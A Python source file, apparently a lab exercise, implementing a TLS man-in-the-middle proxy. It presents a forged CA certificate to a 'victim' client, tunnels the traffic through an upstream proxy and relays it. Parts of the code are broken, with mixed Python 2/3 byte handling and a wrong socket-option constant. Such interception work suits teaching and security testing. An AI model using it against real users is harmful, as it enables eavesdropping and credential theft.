from socket import *
import ssl
import threading
import time
import re
import struct
import string
import os
import sys
import socket as Socket
import select

class HttpHandler(threading.Thread):
    def __init__(self, socket, port) :
        threading.Thread.__init__(self)
        self.socket = socket
        if socket:
            self.client_port = socket.getpeername()[1]
        self.listen_port = port
        # A flag to denote ssl state
        self.sslenable = False

    def init_ssl_connection(self, client_socket):
        # Use your fake certificate to establish connection to victim
        # This function should use
        # 1. send back "HTTP/1.1 200 Connection established\r\n\r\n"
        # 2. use  ssl.wrap_socket to establish ssl-wrap socket connect to victim(use fake certificate )
        # 3. return the ssl-wrap socket
        # ======== Your Code Here!! =======================
        client_socket.send("HTTP/1.1 200 Connection established\r\n\r\n")
        wsock = ssl.wrap_socket(client_socket, "myCA.pem", "myCA.pem", server_side=True, ssl_version=ssl.PROTOCOL_TLS)

        return wsock

    def create_socket_and_connect_to_origin_dst(self, host, port):
        sock = socket()
        addr = Socket.gethostbyname(host)
        print('connect to server [{} {} {}] from client [{}]'.format(host, addr, port, self.socket.getpeername()[1]))
        sock.connect((addr, port))
        return sock

    def read_line(self, source_sock):
        # This function read a line from socket
        line = ""
        while True:
            char = source_sock.recv(1)
            line += char
            if not line.find("\r\n") == -1 :
                return line

    def read_num(self, source_sock, length):
        # read data with lenth from source_sock
        line = ""
        while len(line) < length:
            char = source_sock.recv(1)
            line += char
        return line

    def read_header(self, source_sock):
        #This function read the http header from socket
        header = ""
        line = source_sock.recv(1)

        data = line
        while len(line) :
            line = source_sock.recv(1)
            data += line
            if data.find(b'\r\n\r\n') != -1 :
                header = data
                data = ""
                break
        str_header = header.decode()
        dic_header = dict(re.findall(r"(?P<name>.*?): (?P<value>.*?)\r\n", str_header))
        #print dic_header
        #for (k,v) in dic_header.items():
        #        print k,":",v
        return dic_header, str_header

    def ReadHttp(self, source_sock):
        # Read whole Http packet, and return header and body in string type
        #dic_header, header = self.read_header(source_sock)
        res = self.read_header(source_sock)

        if not res:
            return

        dic_header = res[0]
        header = res[1]
        if 'User-Agent' in dic_header:
            self.user_agent = dic_header['User-Agent']

        body = ""
        if 'Transfer-Encoding' in dic_header and dic_header['Transfer-Encoding'] == 'chunked' :
            line = self.read_line(source_sock)
            body += line
            chunk_size = int(line,16)
            print('chunk size is {}'.format(chunk_size))
            #while True :

            if chunk_size != 0 :
                line = self.read_num(source_sock, chunk_size+2)
                body += line

        else :
            if 'Content-Length' in dic_header :
                length = int(dic_header['Content-Length'])
            else :
                length = 0

            while length>0 :
                line = source_sock.recv(1)
                length -= len(line)
                body += line

            #self.PrinfContent(body)
        return header, body

    def print_content(self, content):
        index = 0
        part = 0x10
        print('[PrintContent]')

        while index < len(content):
            length = part if len(content) - index >= part else len(content) - index
            print("%08d" % index)
            for i in range(index, index+length):
                print(content[i : i+2].encode('hex').upper())
                i += 1
            print_str = ""
            for i in range(index, index+length):
                if content[i] not in string.printable or content[i] in {'\n', '\r', '\t'}:
                    print_str += '.'
                else:
                    print_str += content[i]
            print(print_str)

            index += length

    def get_host_from_header(self, header):
        # Parsing first http packet and find
        # 1) if ssl enable, if header contain "CONNECT 192.168.6.131:443 HTTP/1.1"
        #   then it is https connection, and port and host are return
        # 2) port need to connect
        # 3) host need to conect
        if 'CONNECT' in header:
            self.sslenable = True
        #print "The header is: "+header
        m_host = re.search('Host: (.*)\r\n', header)
        host = m_host.group(1)
        #tokens = str(header).split('\r\n')
        #tokens = tokens[1].split(' ')
        #host = tokens[1]

        if self.sslenable == True:
            port = 443
        else:
            port = 80

        return host, port

    def simple_read(self, socket):
        return socket.recv(8192)

    def relay(self, rsock, host):
        inputs = [rsock, self.socket]
        outputs = []
        while True:
            readable, writable, exceptional = select.select(inputs, outputs, inputs)
            for s in readable:
                if s is rsock:
                    raddr = rsock.getsockname()
                    #print '{0} {1} read server'.format(host, raddr[1])
                    #res = self.ReadHttp(s)
                    res = self.simple_read(s)
                    if res:
                        #self.print_content(res)
                        self.socket.sendall(res)
                    else:
                        print('server [{} {}] close to client [{}]'.format(host, raddr[1], self.client_port))
                        self.socket.close()
                        rsock.close()
                        return
                else:
                    raddr = s.getpeername()
                    #print '{0} {1} read client'.format(host, raddr[1])
                    #res = self.ReadHttp(self.socket)
                    res = self.simple_read(s)
                    if res:
                        #rsock.send(res[0] + res[1])
                        #self.print_content(res)
                        rsock.sendall(res)
                    else:
                        print('server [{} {}] was closed by client [{}]'.format(host, raddr[1], self.client_port))
                        self.socket.close()
                        rsock.close()
                        return

    def send_connect(self, host, proxy, proxy_port):
        sock = socket()
        #if self.sslenable == True:
        #    sock = ssl.wrap_socket(sock)
        #addr = Socket.gethostbyname(host)
        print('connect to proxy [{} {}] from client [{}]'.format(proxy, proxy_port, self.socket.getpeername()[1]))
        print('CONNECT {} HTTP/1.1\r\n'.format(host))
        print('Host: {}\r\n'.format(host))
        print('User-Agent: {}\r\n'.format(self.user_agent))
        print('Proxy-Connection: keep-alive\r\n\r\n')

        try:
            sock.connect((proxy, proxy_port))
        except OSError as err:
            print('Could not connect to proxy:', err)
            sock.close()
            return None

        sock.sendall('CONNECT {}:443 HTTP/1.1\r\n'.format(host).encode())
        sock.sendall('Host: {}\r\n'.format(host).encode())
        sock.sendall('User-Agent: {}\r\n'.format(self.user_agent).encode())
        sock.sendall('Proxy-Connection: keep-alive\r\n\r\n'.encode())

        return sock

    def redirect_proxy(self, host, proxy, proxy_port):
        sock = socket()

        sock.connect((proxy, proxy_port))

    def retrieve_original_addr(self, socket):
        SO_ORIGINAL_DST = 443
        dst = socket.getsockopt(Socket.SOL_IP, SO_ORIGINAL_DST, 16)
        port, raw_ip = struct.unpack_from("!2xH4s", dst)
        ip = Socket.inet_ntop(Socket.AF_INET, raw_ip)
        print('The original addr is {}:{}'.format(ip, port))

    def run(self):
        # self.retrieve_original_addr(self.socket)
        request = self.ReadHttp(self.socket)
        host, port = self.get_host_from_header(request[0])
        print('aaa {}:{}'.format(host, port))

        if ("icloud" in host) or ("dropbox" in host) or ("apple" in host):
            return

        if ("wiki" not in host) and ("neverssl" not in host):
            return


        print(request[0])
        mod_request = request[0].replace('Connection', 'Proxy-Connection')
        # rsock = self.create_socket_and_connect_to_origin_dst(host, int(port))
        proxy_sock = self.send_connect(host, '192.168.56.2', 3128)
        if proxy_sock is None:
            self.socket.close()
            return
        response = self.ReadHttp(proxy_sock)
        print(response)
        context = ssl.create_default_context()
        proxy_sock = context.wrap_socket(proxy_sock, server_hostname=host)
        # self.socket.sendall((response[0] + response[1]).encode())
        proxy_sock.sendall((mod_request + request[1]).encode())
        #print('Client [{}] Request Forwarding Success'.format(self.client_port))
        #response = self.ReadHttp(rsock)
        #print('Server [{}] responded to client [{}]'.format(host, self.client_port))
        #print "server msg: " + response[0]
        #self.print_content(response[1])
        #self.socket.sendall(response[0]+response[1])
        #print('Server sent')
                
        self.relay(proxy_sock, host)

        print('Connection Finished')

def start(ip, port):
    
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain('myCA.pem', 'myCA.pem')
    bind_address = (ip , port)
    server_socket = socket(AF_INET,SOCK_STREAM)
    server_socket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    server_socket.bind(bind_address)
    server_socket.listen(1)
    ssl_socket = context.wrap_socket(server_socket, server_side=True)
    while True :
        client_socket, addr = ssl_socket.accept()
        HttpHandler(client_socket, port).start()
